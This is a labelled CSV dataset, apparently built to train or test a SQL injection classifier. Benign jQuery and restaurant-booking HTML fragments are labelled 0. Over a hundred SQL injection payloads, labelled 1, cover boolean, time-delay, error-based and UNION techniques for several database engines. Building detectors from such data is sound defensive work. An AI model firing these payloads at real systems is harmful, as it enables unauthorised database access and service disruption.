sno,Sentence,Label
4533,n.extend({prop:function(a,0
4534,b,0
4535,c){var d,0
4536,e,0
4537,f=a.nodeType;if(3!==f&&8!==f&&2!==f)return 1===f&&n.isXMLDoc(a)||(b=n.propFix[b]||b,0
4538,-65,0
4539,"- Design: <a rel=""sponsored"" href=""https://www.tooplate.com"" target=""_blank"">Tooplate</a></p>",0
4540,<!--,0
4541,<!-- CSS FILES -->,0
4542,<!-- JAVASCRIPT FILES -->,0
4543,<!doctype html>,0
4544,</a>,0
4545,</a>,0
4546,</a>,0
4547,</a>,0
4548,</a>,0
4549,</a>,0
4550,</a>,0
4551,</body>,0
4552,</button>,0
4553,</div>,0
4554,</div>,0
4555,</div>,0
4556,</div>,0
4557,</div>,0
4558,</div>,0
4559,</div>,0
4560,</div>,0
4561,</div>,0
4562,</div>,0
4563,</div>,0
4564,</div>,0
4565,</div>,0
4566,</div>,0
4567,</div>,0
4568,</div>,0
4569,</div>,0
4570,</div>,0
4571,</div>,0
4572,</div>,0
4573,</div>,0
4574,</div>,0
4575,</div>,0
4576,</div>,0
4577,</footer>,0
4578,</form>,0
4579,</head>,0
4580,</html>,0
4581,</li>,0
4582,</li>,0
4583,</li>,0
4584,</li>,0
4585,</li>,0
4586,</li>,0
4587,</li>,0
4588,</li>,0
4589,</li>,0
4590,</li>,0
4591,</li>,0
4592,</main>,0
4593,</nav>,0
4594,</p>,0
4595,</p>,0
4596,</section>,0
4597,</strong>,0
4598,</ul>,0
4599,</ul>,0
4600,</ul>,0
4601,"<a class=""btn custom-btn custom-border-btn"" href=""reservation.html"">",0
4602,"<a class=""navbar-brand d-flex align-items-center"" href=""index.html"">",0
4603,"<a class=""nav-link"" href=""index.html#section_1"">Home</a>",0
4604,"<a class=""nav-link"" href=""index.html#section_2"">About us</a>",0
4605,"<a class=""nav-link"" href=""index.html#section_3"">Our Menu</a>",0
4606,"<a class=""nav-link"" href=""index.html#section_4"">Testimonials</a>",0
4607,"<a class=""nav-link"" href=""index.html#section_5"">Contact</a>",0
4608,"<a href=""#"" class=""social-icon-link bi-facebook"">",0
4609,"<a href=""#"" class=""social-icon-link bi-whatsapp"">",0
4610,"<a href=""https://x.com/minthu"" target=""_new"" class=""social-icon-link bi-twitter"">",0
4611,"<a href=""mailto:info@yourgmail.com"" class=""site-footer-link"">",0
4612,"<a href=""tel: 305-240-9671"" class=""site-footer-link"">",0
4613,"<body class=""reservation-page"">",0
4614,"<button class=""navbar-toggler"" type=""button"" data-bs-toggle=""collapse"" data-bs-target=""#navbarNav"" aria-controls=""navbarNav"" aria-expanded=""false"" aria-label=""Toggle navigation"">",0
4615,"<button type=""submit"" class=""form-control"">Submit</button>",0
4616,"<div class=""booking-form-body"">",0
4617,"<div class=""booking-form-image-wrap"">",0
4618,"<div class=""booking-form-wrap"">",0
4619,"<div class=""collapse navbar-collapse"" id=""navbarNav"">",0
4620,"<div class=""col-lg-10 col-12 mx-auto"">",0
4621,"<div class=""col-lg-12 col-12"">",0
4622,"<div class=""col-lg-3 col-12 mt-4 mb-3 mt-lg-0 mb-lg-0"">",0
4623,"<div class=""col-lg-4 col-12 me-auto"">",0
4624,"<div class=""col-lg-4 col-md-10 col-8 mx-auto mt-2"">",0
4625,"<div class=""col-lg-5 col-12 p-0"">",0
4626,"<div class=""col-lg-5 col-12"">",0
4627,"<div class=""col-lg-6 col-12"">",0
4628,"<div class=""col-lg-6 col-12"">",0
4629,"<div class=""col-lg-6 col-12"">",0
4630,"<div class=""col-lg-6 col-12"">",0
4631,"<div class=""col-lg-7 col-12 p-0"">",0
4632,"<div class=""col-lg-8 col-12 mt-4"">",0
4633,"<div class=""container"">",0
4634,"<div class=""container"">",0
4635,"<div class=""container"">",0
4636,"<div class=""ms-lg-3"">",0
4637,"<div class=""row"">",0
4638,"<div class=""row"">",0
4639,"<div class=""row"">",0
4640,"<div class=""row"">",0
4641,"<div class=""text-center mb-4 pb-lg-2"">",0
4642,"<em class=""text-white d-block mb-4"">Contact</em>",0
4643,"<em class=""text-white d-block mb-4"">Opening Hours.</em>",0
4644,"<em class=""text-white d-block mb-4"">Where to find us?</em>",0
4645,"<em class=""text-white"">Fill out the booking form</em>",0
4646,"<footer class=""site-footer"">",0
4647,"<form class=""custom-form booking-form"" action=""#"" method=""post"" role=""form"">",0
4648,"<h2 class=""text-white"">Book a table</h2>",0
4649,<head>,0
4650,"<html lang=""en"">",0
4651,"<i class=""bi-arrow-up-right ms-2""></i>",0
4652,"<i class=""bi-geo-alt me-2""></i>",0
4653,"<img src=""images/barman-with-fruits.jpg"" class=""booking-form-image img-fluid"" alt="""">",0
4654,"<img src=""images/coffee-beans.png"" class=""navbar-brand-image img-fluid"" alt="""">",0
4655,"<input class=""form-control"" type=""time"" name=""booking-form-time"" value=""18:30"">",0
4656,"<input type=""date"" name=""booking-form-date"" id=""booking-form-date"" class=""form-control"" placeholder=""Date"" required="""">",0
4657,"<input type=""number"" name=""booking-form-number"" id=""booking-form-number"" class=""form-control"" placeholder=""Number of People"" required="""">",0
4658,"<input type=""tel"" class=""form-control"" name=""booking-form-phone"" placeholder=""Phone: 085 456 7890"" pattern=""[0-9]{3}-[0-9]{3}-[0-9]{4}"" required="""">",0
4659,1 )  as dlkh where 6179 = 6179 and 9198 = 9198--,1
4660,"1  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
4661,"1%' )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( '%' = '",1
4662,"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
4663,"1  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
4664,-6488' or 5164 = 9234,1
4665,"1"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""deeu"" like ""deeu",1
4666,"1  )  )   as fmpr where 3103 = 3103 and elt ( 9970 = 9297,9297 ) --",1
4667,"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( ""khuw"" like ""khuw",1
4668,"1 )  as yduh where 6481 = 6481 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
4669,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""ksip"" like ""ksip",1
4670,"1"" )  as mszg where 6184 = 6184 rlike sleep ( 5 ) --",1
4671,"1%""  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""%"" = """,1
4672,"1'|| ( select 'ryyc' from dual where 5196 = 5196 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
4673,"-2284%""  )  )   or 9323 = 9323#",1
4674,"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1
4675,"1"" rlike sleep ( 5 ) ",1
4676,"1%"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""%"" = """,1
4677,-4308' )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ,1
4678,1' )  as scnn where 9274 = 9274,1
4679,"-9313%"" )  or 5971 = 4572#",1
4680,"1%' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and '%' = '",1
4681,1' waitfor delay '0:0:5' and 'jree' = 'jree,1
4682,1' )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'yaim' = 'yaim,1
4683,1%'  )  )   union all select null#,1
4684,-4498 )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ),1
4685,1' and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and 'pziy' = 'pziy,1
4686,1'|| ( select 'byxb' where 8351 = 8351 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )  ||',1
4687,"1""  )  )   as wnzf where 3352 = 3352 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
4688,1'+ ( select 'iqxn' where 1146 = 1146 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )    )  )  +',1
4689,"1'  )  )   as kpdl where 4443 = 4443 union all select null,null,null,null,null,null--",1
4690,"1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( 'jvll' like 'jvll",1
4691,"1""  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""urqg"" = ""urqg",1
4692,-7779' )  where 4976 = 4976 or 6872 = 6872--,1
4693,"select pg_sleep ( 5 )  and ""zhsc"" = ""zhsc",1
4694,select  ( case when  ( 7645 = 5921 )  then 7645 else 7645* ( select 7645 from information_schema.character_sets )  end ) #,1
4695,1' )  as pxcd where 9754 = 9754 or sleep ( 5 ) --,1
4696,"1  )  )   as prnp where 4932 = 4932 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
4697,"1'  )  )   and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (  'ocfi' = 'ocfi",1
4698,"1""  )  )   as tjdz where 8656 = 8656 union all select null,null,null,null,null--",1
4699,-5020%' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  ,1
4700,"-3633' )  where 3513 = 3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",1
4701,"1""  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( ""jref"" like ""jref",1
4702,1%' and sleep ( 5 ) #,1
4703,-4538'  )  )   )  or 3260 = 1236 and   (  (   ( 'hpnd' like 'hpnd,1
4704,"-4136'  )  )   as cczp where 7052 = 7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",1
4705,"1 )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
4706,"-6407' )  or elt ( 1631 = 4946,4946 )  and  ( 'jpnz' = 'jpnz",1
4707,"1""  )  )   as ccjk where 1932 = 1932 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
4708,1' where 4115 = 4115,1
4709,"1"" )  as gjlv where 1983 = 1983 and sleep ( 5 ) #",1
4710,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual-- vykx",1
4711,"-3860' union all select 3510,3510,3510#",1
4712,1' in boolean mode )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
4713,"-4527' union all select 7115,7115#",1
4714,"-3672""  )  )   union all select 6093#",1
4715,"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'zeum' = 'zeum",1
4716,"select count ( * )  from generate_series ( 1,5000000 )  and  ( ""jzmg"" = ""jzmg",1
4717,"select count ( * )  from generate_series ( 1,5000000 ) ",1
4718,"1'  )  )   union all select null,null,null,null,null,null,null,null,null#",1
4719,1%'  )  )   )  waitfor delay '0:0:5'--,1
4720,1' where 4473 = 4473 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
4721,"1 )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( 4959 = 4959",1
4722,"1"" )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""azpb"" = ""azpb",1
4723,"1%' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and '%' = '",1
4724,1%'  )  )   )  or sleep ( 5 )  and   (  (   ( '%' = ',1
4725,1'|| ( select 'xtcb' where 5240 = 5240,1
4726,"1'  )  )   as popm where 6594 = 6594 union all select null,null#",1
4727, ( select  ( case when  ( 7018 = 7018 )  then 7018 else 7018* ( select 7018 from master..sysdatabases )  end  )  )  ,1
4728,-7770' where 6503 = 6503 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122,1
4729,"1""  )  )   or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""nobt"" = ""nobt",1
4730,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ",1
4731,"1, ( select  ( case when  ( 5777 = 5777 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ",1
4732,"1"" )  where 5065 = 5065",1
4733,"1'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 'kbkz' = 'kbkz",1
4734,-2806'  )  )   )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +cha,1
4735,"-9854%""  )  )   )  or 6455 = 3652",1
4736,"1' where 4272 = 4272 union all select null,null,null,null#",1
4737,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",1
4738,1 )  as tykp where 6851 = 6851,1
4739,"1'  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  'dkra' like 'dkra",1
4740,-3186 or 3867 = 9405,1
4741,"1""  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""quni"" = ""quni",1
4742,"1'  )  )   as jmnw where 6496 = 6496 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
4743,"1' )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'obmu' = 'obmu",1
4744,"-4705' where 2029 = 2029 union all select 2029,2029,2029#",1
4745,1 where 4153 = 4153 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
4746,"1"" )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
4747,"1"" )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( ""oxxi"" = ""oxxi",1
4748,1'|| ( select 'ozoj' where 1608 = 1608,1
4749,"-5493""  )  )   union all select 8001,8001--",1
4750,"1'  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
4751,"1'  )  )   )  union all select null,null,null,null,null,null,null#",1
4752,"1  )  )   union all select null,null,null,null,null,null,null,null,null,null#",1
4753,"1""  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""dksc"" = ""dksc",1
4754,"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and  ( ""%"" = """,1
4755,1'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'ugoz' = 'ugoz,1
4756,-7207' or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) |,1
4757,1 )  as fhvb where 4008 = 4008,1
4758,"-4798%'  )  )   )  union all select 3330,3330,3330#",1
4759,"1%' )  union all select null,null,null,null,null,null,null,null#",1
4760,"-6496""  )  )   )  or 1471 = 5278 and   (  (   ( ""zkoj"" = ""zkoj",1
4761,"waitfor delay '0:0:5' and  ( ""%"" = """,1
4762,"1%""  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""%"" = """,1
4763,"1"" and make_set ( 8403 = 8403,8899 )  and ""fqxr"" like ""fqxr",1
4764,"waitfor delay '0:0:5' and   (  (   ( ""lpeo"" = ""lpeo",1
4765,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'drui' like 'drui",1
4766,1'  )  )   )  rlike  ( select  ( case when  ( 5524 = 9582 )  then 1 else 0x28 end  )  )   and   (  (   ( 'okoj' like 'okoj,1
4767,"-1337"" )  union all select 7508--",1
4768,"-2722"" )  or 4907 = 8126#",1
4769,"1"" and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and ""ardk"" like ""ardk",1
4770,"1%""  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( ""%"" = """,1
4771,"1' and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and 'wytg' = 'wytg",1
4772,"1%"" )  union all select null#",1
4773,1'|| ( select 'gnil' from dual where 7552 = 7552 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   ) ||',1
4774,1  )  )   as uvep where 6016 = 6016 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1
4775,1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  'vpqr' = 'vpqr,1
4776,"1', ( select  ( case when  ( 1609 = 1609 )  then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases )  end  )  )  ",1
4777,"1""  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  ""cowu"" like ""cowu",1
4778,-5211 union all select 1754--,1
4779,"1"" )  as bpmk where 6412 = 6412 union all select null,null,null,null#",1
4780,"1  )  )   as mgvw where 4923 = 4923 union all select null,null,null,null--",1
4781,"1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'kqip' like 'kqip",1
4782,"-9054"" )  as rgyu where 3792 = 3792 order by 1--",1
4783,-6766'  )  )   )  or 3038 = 3038,1
4784,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'yqrt' like 'yqrt",1
4785,1 )  as vqdh where 1603 = 1603,1
4786,"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'yiem' = 'yiem",1
4787,"1%"" )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
4788,"1' in boolean mode )  union all select null,null,null,null,null,null,null#",1
4789,"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and ""cgpm"" like ""cgpm",1
4790,"1"" where 5250 = 5250",1
4791,"1'  )  )   as umah where 3781 = 3781 union all select null,null,null,null#",1
4792, ( select  ( case when  ( 9525 = 9280 )  then 9525 else 9525* ( select 9525 from master..sysdatabases )  end  )  )  ,1
4793,"-9315'  )  )   )  union all select 5057,5057,5057,5057,5057#",1
4794,"-2962'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +ch",1
4795,1  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 2197 = 2197,1
4796,"1%""  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
4797,1' where 3337 = 3337 and 8403 = 5760,1
4798,"1"" or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
4799,"1  )  )   as faxr where 7972 = 7972 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
4800,"1"" )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""vurb"" like ""vurb",1
4801,1 )  where 8094 = 8094,1
4802,"1%'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( '%' = '",1
4803, ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( 'jirc' = 'jirc,1
4804,"1'+ ( select 'ples' where 4244 = 4244 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  +'",1
4805,"1%"" and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""%"" = """,1
4806,"1 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- yekf",1
4807,if ( 8574 = 7534 )  select 8574 else drop function nxbe--,1
4808,1' )  and 7533 = 7533,1
4809,"1 )  union all select null,null,null,null--",1
4810,1'|| ( select 'scct' where 2587 = 2587 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  ||',1
4811,-6449'  )  )   or 2590 = 2848,1
4812,1' where 3362 = 3362,1
4813,-1252' )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ,1
4814,-8684' where 9820 = 9820 or 6844 = 5105,1
4815,"1%'  )  )   )  union all select null,null,null,null--",1
4816,"1'  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  'inrm' like 'inrm",1
